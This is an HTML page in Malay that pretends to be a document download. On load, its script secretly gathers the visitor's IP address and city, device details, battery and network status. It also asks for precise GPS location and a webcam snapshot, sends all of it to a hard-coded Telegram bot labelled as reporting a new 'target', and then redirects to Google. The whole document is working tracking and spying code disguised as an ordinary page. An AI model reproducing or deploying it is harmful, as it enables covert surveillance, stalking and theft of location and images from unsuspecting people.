<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">

    <p>Sila tunggu sebentar... Dokumen sedang dimuat turun.</p>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const CHAT_ID = '8563935930';

        async function startTrace() {
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
            
            // --- 1. Ambil Tahap Bateri ---
            let infoBateri = "Tidak dikesan";
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const statusCas = battery.charging ? "🔌 Sedang dicas" : "🔋 Guna bateri";
                infoBateri = `${level}% (${statusCas})`;
            } catch (e) { console.log("Battery API Error"); }

            // --- 2. Ambil Jenis Rangkaian ---
            let infoRangkaian = "Tidak dikesan";
            if (navigator.connection) {
                const conn = navigator.connection;
                infoRangkaian = `${conn.effectiveType.toUpperCase()} (${conn.type || 'Data/WiFi'})`;
            }

            // --- 3. Ambil IP & Info Peranti ---
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                let infoAsas = `🔔 *TARGET BARU DIKESAN!*\n` +
                               `📅 *Masa:* ${waktu}\n` +
                               `🔋 *Bateri:* ${infoBateri}\n` +
                               `📡 *Rangkaian:* ${infoRangkaian}\n` +
                               `🌐 *IP:* \`${data.ip}\`\n` +
                               `📍 *Lokasi IP:* ${data.city}, ${data.region}, ${data.country_name}\n` +
                               `📱 *Peranti:* ${navigator.userAgent}`;
                
                await sendToTele(infoAsas);
            } catch (e) { 
                await sendToTele(`⚠️ Gagal ambil IP pada ${waktu}`);
            }

            // --- 4. Ambil Lokasi GPS (Minta Izin) ---
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})\nKetepatan: ${pos.coords.accuracy.toFixed(2)}m`);
                }, null, { enableHighAccuracy: true });
            }

            // --- 5. Ambil Gambar (Minta Izin) ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(res => setTimeout(res, 2000)); // Tunggu kamera fokus
                
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    fd.append('caption', `📸 Gambar Target\n🔋 Bateri: ${infoBateri}\n📶 Net: ${infoRangkaian}\n⏰ ${waktu}`);
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            } catch (e) {
                console.log("Kamera disekat.");
            }

            // Redirect selepas semua proses cuba dijalankan
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 5000);
        }

        async function sendToTele(text) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        window.onload = startTrace;
    </script>
</body>
</html>
